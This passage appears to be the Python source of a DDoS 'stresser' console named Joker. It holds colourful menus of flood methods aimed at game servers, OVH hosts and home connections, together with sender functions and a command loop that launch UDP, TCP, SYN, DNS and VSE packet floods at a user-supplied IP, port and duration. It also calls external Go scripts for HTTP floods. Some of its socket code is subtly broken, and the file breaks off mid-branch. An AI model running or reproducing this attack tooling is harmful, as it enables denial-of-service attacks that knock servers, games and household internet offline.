#!/usr/bin/env python3
#-*- coding: utf-8 -*- and #-*- coding: utf-7 -*-
#██╗  ██╗██╗   ██╗███╗   ██╗ ██████╗  ██████╗ ███████╗███╗   ██╗██████╗ 
#██║  ██║██║   ██║████╗  ██║██╔════╝ ██╔════╝ ██╔════╝████╗  ██║╚════██╗
#███████║██║   ██║██╔██╗ ██║██║  ███╗██║  ███╗█████╗  ██╔██╗ ██║ █████╔╝
#██╔══██║██║   ██║██║╚██╗██║██║   ██║██║   ██║██╔══╝  ██║╚██╗██║ ╚═══██╗
#██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝╚██████╔╝███████╗██║ ╚████║██████╔╝
#╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═════╝
#Coc Hy Hung Developer
from operator import index
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json


nicknm = "user"

methods = """
\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[35m╚══════════╗
\033[35m║ \033[93mgen3    \033[36m> \033[32mShows Gen3 Methods!     \033[35m║
\033[35m║ \033[32mlayer4  \033[36m> \033[32mShows Layer 4 Methods!  \033[35m║
\033[35m║ \033[32mlayer7  \033[36m> \033[32mShows Layer 7 Methods!  \033[35m║
\033[35m║ \033[32mhome    \033[36m> \033[32mShows Home Methods!     \033[35m║
\033[35m║ \033[32mprivate \033[36m> \033[32mShows Private Methods!  \033[35m║
\033[35m║ \033[32mvip     \033[36m> \033[32mShows VIP Methods!      \033[35m║
\033[35m║ \033[32mraw     \033[36m> \033[32mShows Raw Methods!      \033[35m║
\033[35m╚═══════════════════════════════════╝
"""

vip = """
\033[35m                                       ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                       ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                      ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                                  🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════════╦════════════════════════════════╗
\033[35m            ║   \033[32mudpv3 \033[36m[IP] [TIME] [PORT]  \033[35m ║   \033[32mvse-tcp \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ║   \033[32mtcpv3 \033[36m[IP] [TIME] [PORT]  \033[35m ║   \033[32mtcp-ack \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚╦════════════════════════════╦╩╦══════════════════════════════╦╝
\033[35m             ║ \033[32mstdfuck \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32mdnsbypass \033[36m[IP] [TIME] [PORT] \033[35m║
\033[35m             ║ \033[32msynflood \033[36m[IP] [TIME] [PORT]\033[35m║ ║ \033[32movhshit \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║\033[36m     - - - - - - - \033[93mhomerape \033[32m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m   ║
\033[35m            ╔╩════════════════════════════╝ ╚══════════════════════════════╩╗
\033[35m            ║       \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m     ║
\033[35m            ╚═══════════════════════════════════════════════════════════════╝
"""

raw = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mudpraw \033[36m- \033[32mRaw UDP Flood \033[35m  ║ \033[32mhexraw \033[36m- \033[32mRaw HEX Flood \033[35m    ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mtcpraw \033[36m- \033[32mRaw TCP Flood \033[35m║ ║ \033[32mvseraw \033[36m- \033[32mRaw VSE Flood \033[35m  ║
\033[35m             ║ \033[32mstdraw \033[36m- \033[32mRaw STD Flood \033[35m║ ║ \033[32msynraw \033[36m- \033[32mRaw SYN Flood \033[35m  ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32movhslav \033[36m- \033[32mSlavic Flood \033[35m  ║ \033[32miotv1 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ║ \033[32mcpukill \033[36m- \033[32mCpu Rape Flood\033[35m ║ \033[32miotv2 \033[36m- \033[32mCustom Method!  \033[35m   ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mfivemkill \033[36m- \033[32mFivem Kill \033[35m║ ║ \033[32miotv3 \033[36m-\033[32m Custom Method!  \033[35m ║
\033[35m             ║ \033[32micmprape  \033[36m- \033[32mICMP Rape  \033[35m║ ║ \033[32mssdp  \033[36m-\033[32m Amped SSDP      \033[35m ║
\033[35m             ║ \033[32mtcprape \033[36m- \033[32mRaping TCP   \033[35m║ ║ \033[32marknull \033[36m- \033[32mArk Method    \033[35m ║
\033[35m             ║ \033[32mnforape \033[36m- \033[32mNfo Method   \033[35m║ ║ \033[32m2kdown  \033[36m- \033[32mNBA 2K Flood  \033[35m ║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║ \033[32mhomeslap    \033[36m. \033[32mr6kill     \033[35m║ \033[32mfivemtcp  \033[36m. \033[32mnfokill       \033[35m ║
\033[35m            ║ \033[32mark255      \033[36m. \033[32marklift    \033[35m║ \033[32mhotspot   \033[36m. \033[32mvpn           \033[35m ║
\033[35m            ║ \033[32mhydrakiller \033[36m. \033[32markdown    \033[35m║ \033[32mnfonull   \033[36m. \033[32mdhcp          \033[35m ║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32movhnat    \033[36m. \033[32movhamp     \033[35m║ ║ \033[32movhwdz    \033[36m. \033[32movhx         \033[35m║
\033[35m             ║ \033[32mnfodrop   \033[36m. \033[32mnfocrush   \033[35m║ ║ \033[32mnfodown   \033[36m. \033[32mnfox         \033[35m║
\033[35m             ║ \033[32mudprape   \033[36m. \033[32mudprapev3  \033[35m║ ║ \033[32mfortnite  \033[36m. \033[32mfortnitev2   \033[35m║
\033[35m             ║ \033[32mudprapev2 \033[36m. \033[32mudpbypass  \033[35m║ ║ \033[32mgreeth    \033[36m. \033[32mtelnet       \033[35m║
\033[35m             ║ \033[32mfivemv2   \033[36m. \033[32mr6drop     \033[35m║ ║\033[32m r6freeze  \033[36m. \033[32mkillall      \033[35m║
\033[35m             ║ \033[32m2krape    \033[36m. \033[32mfallguys   \033[35m║ ║ \033[32movhdown   \033[36m. \033[32movhkill      \033[35m║
\033[35m             ║ \033[32mfivemrape \033[36m. \033[32mfivemdown  \033[35m║ ║ \033[32mfivemv1   \033[36m. \033[32mfivemslump   \033[35m║
\033[35m             ║ \033[32mkillallv2 \033[36m. \033[32mkillallv3  \033[35m║ ║ \033[32mpowerslap \033[36m. \033[32mrapecom      \033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""
updates =  """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m                 Update Logs                   \033[35m║
\033[35m                ║\033[32m                                               \033[35m║
\033[35m                ║\033[32m                 Coming Soon!                  \033[35m║
\033[35m                ║\033[32m                                               \033[35m║
\033[35m                ╚═══════════════════════════════════════════════╝
"""
layer7 =  """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m                 HTTP-GET(Fail)                \033[35m║
\033[35m                ║\033[32m                 CRASH-BROWSER                  \033[35m║
\033[35m                ║\033[32m                   HTTP-FIX                    \033[35m║
\033[35m                ║\033[32m                 Coming Soon!                  \033[35m║
\033[35m                ╚═══════════════════════════════════════════════╝
"""

help =  """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m                      Help                     \033[35m║
\033[35m                ║\033[32m                                               \033[35m║
\033[35m                ║\033[32m             ? - Help menu by HungGen3         \033[35m║
\033[35m                ║\033[32m              methods - Shows methods          \033[35m║
\033[35m                ║\033[32m               exit - Exit JokerNet            \033[35m║
\033[35m                ║\033[32m            updates - Show update logs         \033[35m║
\033[35m                ║\033[32m                                               \033[35m║
\033[35m                ║\033[32m    INFO: Removed catagories that don't work   \033[35m║
\033[35m                ║\033[32m                                               \033[35m║
\033[35m                ╚═══════════════════════════════════════════════╝
"""

layer4 = """
\033[35m                                 ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                 ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                            🤡 We are al\033[32ml clowns 🤡

\033[35m            ╔══════════════════════════╦════════════════════════════╗
\033[35m            ║  \033[32mudp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mvse \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ║  \033[32mtcp \033[36m[IP] [TIME] [PORT]  \033[35m║   \033[32mack \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[35m             ║ \033[32mstd \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32mdns \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║ \033[32msyn \033[36m[IP] [TIME] [PORT] \033[35m║ ║ \033[32movh \033[36m[IP] [TIME] [PORT]   \033[35m║
\033[35m             ║\033[36m- - - - - - - \033[93mhomerape \033[32m[IP] [TIME] [PORT] \033[36m- - - - - -\033[35m║
\033[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[35m            ║    \033[32mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[35m║
\033[35m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\033[35m                                  ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                  ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                 ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                             🤡 We are al\033[32ml clowns 🤡

\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Joker vF By \033[36m@iotnet \033[35m- - - - - - -║
\033[35m                ║\033[32m- - - - - - - Recoded By \033[36mHungGen3\033[35m - - - - - - -║
\033[35m                ║\033[32m  - - - Type \033[36m?\033[35m to see the Help Menu - - - - -  ║
\033[35m                ╚═══════════════════════════════════════════════╝
\033[35m                    ╔════════════════════════════════════════╗
\033[35m                    ║\033[32m- -Connection Has Been \033[36m(ESTABILISHED)- -\033[35m║
\033[35m                    ╚════════════════════════════════════════╝
\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - - Powerful by \033[36mPython3\033[35m - - - - - - -║
\033[35m                ║\033[32m  - - -  Bypass\033[36m VIP\033[35m OVH, TCP, UDP   - - - - -  ║
\033[35m                ╚═══════════════════════════════════════════════╝
"""
home = """
\033[35m                                           ╦╔═╗╦╔═\033[32m╔═╗╦═╗
\033[35m                                           ║║ ║╠╩╗\033[32m║╣ ╠╦╝
\033[35m                                          ╚╝╚═╝╩ ╩\033[32m╚═╝╩╚═
\033[35m                                      🤡 We are al\033[32ml clowns 🤡
\x1b[0;38;2;0;228;255m                         ╔══════════════════════════════════════════════╗
\x1b[0;38;2;0;219;255m                 ╔═══════╩═══════╗                              ╔═══════╩═══════╗
\x1b[0;38;2;0;210;255m                 ║\033[32m   HOMEFUCK    \x1b[0;38;2;0;210;255m║                              ║\033[32m    ONHOLD     \x1b[0;38;2;0;210;255m║
\x1b[0;38;2;0;201;255m                 ║\033[32m   HOMEBYPASS  \x1b[0;38;2;0;201;255m║                              ║\033[32m    HOMEOVH    \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;192;255m                 ║\033[32m   HOMENULL    \x1b[0;38;2;0;192;255m║                              ║\033[32m    HOMEXS     \x1b[0;38;2;0;192;255m║
\x1b[0;38;2;0;183;255m                 ║\033[32m   HOMEKILL    \x1b[0;38;2;0;183;255m║                              ║\033[32m    HOMESERVER \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;174;255m                 ╚═══════════════╝                              ╚═══════════════╝
\x1b[0;38;2;0;165;255m            		  
\x1b[0;38;2;0;156;255m            		         ╔═══════════════════════════════╗
\x1b[0;38;2;0;147;255m            		         ║\033[31m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;147;255m║
\x1b[0;38;2;0;138;255m            		         ╚═══════════════════════════════╝
\x1b[0m"""

fsubs = -1024
tpings = -1024
pscans = -1024
liips = -1024
tattacks = -1024
uaid = -1024
said = -1024
running = -1024
iaid = -1024
haid = -1024
aid = -1024
attack = True
ldap = True
http = True
atks = -1024
onehold = True
udp = True
icmp = True

# Methods Rules
fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
tpings = 0
pscans = 0
liips = 0
running = 0
aid = 0
atks = 0
attack = True

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
def onholdsender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1
def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1
def homeudp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1 

def homeudpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def homeicmp(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1
def homeicmpivp6(host, port, timer, bytes):
    global atks
    global running
    timeout = time.time() + float(timer)
    sock = socket.socket(socket.AF_INET6, socket.IPPROTO_IGMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    atks += 1
    running += 1
    while time.time() < timeout and attack:
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
        sock.sendto(bytes, (host, int(port)))
    atks -= 1
    running -= 1
def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global udp
	global icmp
	global syn
	global tcp
	global dp
	global http

	while True:
		bots = (random.randint(8,63))
		sys.stdout.write("\x1b]2;Joker. | number_powered: [{}] | Facebook: CocHyHung.Facebook.Information\x07".format (bots))
		sin = input("\033[32m[\033[35m{}\033[32m@Joker]\033[36m$ \033[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls" or "clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("cls" or "clear")
			print (banner)
			main()
		elif sinput == "updates":
			os.system ("cls" or "clear")
			print (updates)
			main()
		elif sinput == "?":
			os.system ("cls" or "clear")
			print (help)
			main()
		elif sinput == "layer4":
			os.system ("cls" or "clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("cls" or "clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("cls" or "clear")
			print (methods)
			main()
		elif sinput == "home":
			os.system ("cls" or "clear")
			print (home)
			main()
		elif sinput == "private":
			os.system ("cls" or "clear")
			print (private)
			main()
		elif sinput == "vip":
			os.system("cls" or "clear")
			print (vip)
			main()
		elif sinput == "gen3":
			os.system ("cls" or "clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("cls" or "clear")
			print (raw)
			main()
		elif sinput == "layer7":
			os.system ("cls" or "clear")
			print (layer7)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("cls" or "clear")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdfuck":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "crash-browser":
			try:
				url = sin.split()[1]
				os.system(f'go run crash.go -site {url}')
			except ValueError:
				main()
			except IndexError:
				print("crash-browser <URL>")
		elif sinput == "http-fix":
			try:
				url = sin.split()[1]
				thread = sin.split()[2]
				method = sin.split()[3]
				time = sin.split()[4]
				os.system(f'go run http.go {url} {thread} {method} {time} nil')
			except ValueError:
				main()
			except IndexError:
				print('Usage: http-fix <url> <threads> METHODS<GET/POST> <time>')
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhfuck":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()

		elif sinput == "dnsbypass":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse-tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "synflood":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpv3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mYour Attack Has Been Launched!")
			except ValueError:
